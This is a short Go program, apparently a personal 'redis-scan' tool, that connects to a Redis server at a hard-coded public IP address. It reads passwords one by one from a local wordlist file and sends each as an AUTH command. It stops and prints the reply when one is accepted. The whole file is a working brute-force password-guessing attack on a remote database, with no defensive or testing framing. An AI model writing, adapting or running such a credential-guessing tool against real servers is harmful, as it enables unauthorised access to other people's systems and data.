package main

import (
	"bufio"
	"fmt"
	"github.com/gomodule/redigo/redis"
	"io"
	//"io/ioutil"
	"log"
	"os"
)
const (
	REMOTE_URL = "redis://59.75.112.20:6379"
)
var cnt int
func main() {

	c,err := redis.DialURL(REMOTE_URL)
	if err != nil {
		log.Println("url",err)
	}

	file,err := os.Open("F:\\toys\\scanner\\redis-scan\\password.txt")
	defer file.Close()
	if err != nil{
		log.Fatal(err)
	}
	buf := bufio.NewReader(file)
	for {
		//读取文件每一行
		password,err := buf.ReadString('\n')
		if err != nil{
			if err == io.EOF {
				log.Println("文件读取完毕")
				break
			}else{
				log.Fatal(err)
			}
		}
		//对每一个密码进行验证
		log.Println(password)
		tryRedisPassword(password,c)
	}
	//log.Println(string(content))
	//c, err := redis.DialURL("redis://59.75.112.20:6379")

	if err != nil {
		log.Fatal(err)
	}
	//reply,err := c.Do("auth","10")
	//fmt.Println(reply)

	//defer c.Close()
	fmt.Println(cnt)
}

func tryRedisPassword(password string,c redis.Conn) string{
	reply,err := c.Do("auth", password)
	if  err != nil{
		log.Println(err)
		cnt ++
	}else{
		fmt.Println(reply)
		os.Exit(1)
	}
	//if result,ok := reply.(string); ok {
	//	if strings.Contains(result, "invalid") {
	//		fmt.Println(result)
	//	}
	//}
	return "1"
}
